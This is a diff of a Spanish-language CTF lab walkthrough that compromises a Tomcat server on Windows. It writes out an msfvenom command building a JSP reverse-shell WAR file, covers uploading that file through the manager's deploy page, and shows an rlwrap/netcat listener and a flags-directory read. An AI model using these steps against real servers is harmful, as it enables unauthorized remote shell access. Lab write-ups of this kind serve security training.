@@ -104,14 +104,18 @@ Mediante `msfvenom` podemos tratar de comprobar una gran cantidad de herramienta
 Vamoa a utilizar  la herramienta `jsp_shell_reverse_tcp`. Esta herramienta, especificandole nuestro host de escucha y el puerto mediante el siguiente
 comando, nos creará un archivo en formato `.war` capaz de crear una shell inversa desde la máquina víctima.
 
-    msfvenom -p- java/sjp_shell_reverse_tcp LHOST=10.10.10.14.29 LPORT=8080 -f war -o shell.war
+![Captura de pantalla -2022-05-09 11-02-02](https://user-images.githubusercontent.com/103068924/167385544-1f78a708-b08c-4c23-b6b3-8787c0f05fd4.png)
+
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.14.29 LPORT=8080 -f war -o shell.war
+    
+![Captura de pantalla -2022-05-09 11-02-02](https://user-images.githubusercontent.com/103068924/167376951-11f44b27-79b4-4988-b325-4f8e8423ccb7.png)
     
 Una vez creado nuestro archivo `shell.war` vamos a subirlo a la máquina victima, pero antes, debemos mover nuestro archivo
 al directorio `Descargas/Downloads`:
 
 ![Captura de pantalla -2022-05-07 15-32-25](https://user-images.githubusercontent.com/103068924/167373933-05569db6-7535-4e68-b2a3-ae5c0e72fb63.png)
 
-Ahora mediante el apartado de la página llamado `Archivo WAR a desplegar` subimos nuestro archivo `shel.war`.
+Ahora mediante el apartado de la página llamado `Archivo WAR a desplegar` subimos nuestro archivo `shell.war`.
 
 ![Captura de pantalla -2022-05-07 15-32-55](https://user-images.githubusercontent.com/103068924/167374610-e9b1e566-2a29-4116-bfec-33a11ae25fc6.png)
 
@@ -121,13 +125,41 @@ Ahora mediante el apartado de la página llamado `Archivo WAR a desplegar` subim
 
 ![Captura de pantalla -2022-05-07 15-34-42](https://user-images.githubusercontent.com/103068924/167374683-17d0860c-4808-40af-9788-25955448d081.png)
 
-Recargamos la página y vemos como aparece nuestro archivo. El siguiente paso será ponerno en escucha por el puerto `8080` mediante `nc`:
+Recargamos la página y vemos como aparece nuestro archivo. El siguiente paso será ponerno en escucha por el puerto `8080` mediante `nc` como se 
+trata de un sistema windows utilizaremos `rlwarp`:
+
+    rlwrap nc -lvnp 8080
+
+![Captura de pantalla -2022-05-09 11-07-21](https://user-images.githubusercontent.com/103068924/167385711-908c4b6b-e40d-48c2-8978-5536a0850301.png)
 
 
+![Captura de pantalla -2022-05-09 11-07-30](https://user-images.githubusercontent.com/103068924/167386060-d0be171e-6afb-468c-a5c4-8699f4ffc08a.png)
 
 
+Ahora para ejecutar el archivo, simplemente nos vamos a la página y lo pulsamos.
 
 
+![Captura de pantalla -2022-05-09 11-49-32](https://user-images.githubusercontent.com/103068924/167386089-4cd94622-03f5-45df-83d6-da925a2ea417.png)
+
+Vemos como la shell se nos despliega en la terminal que tenemos en escucha con Netcat.
+
+![Captura de pantalla -2022-05-09 11-55-16](https://user-images.githubusercontent.com/103068924/167386486-2bea3986-982e-4163-8293-4cf58fccc4f4.png)
+
+Está maquina ya esta básicamente terminada ya que las dos flags se encuentran en el mismo archivo, el cual se encuentra en el directorio 
+`C:\Users\Administrator\Desktop\flags`:
+
+    cd /Users/Administrator/Desktop/flags
+    
+Vemos como dentro del directorio `flags` se encuenta el archivo `2 for the price at 1.txt`
+
+![Captura de pantalla -2022-05-09 12-01-47](https://user-images.githubusercontent.com/103068924/167387535-4165e282-73a2-4d0a-a41a-4893cd492ef6.png)
+
+Y finalmente, mediante `type` podemos visualizar el contenido:
+
+![Captura de pantalla -2022-05-07 15-59-28](https://user-images.githubusercontent.com/103068924/167387517-8daf25ec-3c37-486f-8695-2894ca5daabe.png)
+
+
+![Captura de pantalla -2022-05-09 09-36-58](https://user-images.githubusercontent.com/103068924/167387740-ca9ebbf6-6e75-47f5-b8e5-076a6e0eee27.png)
 
 
 
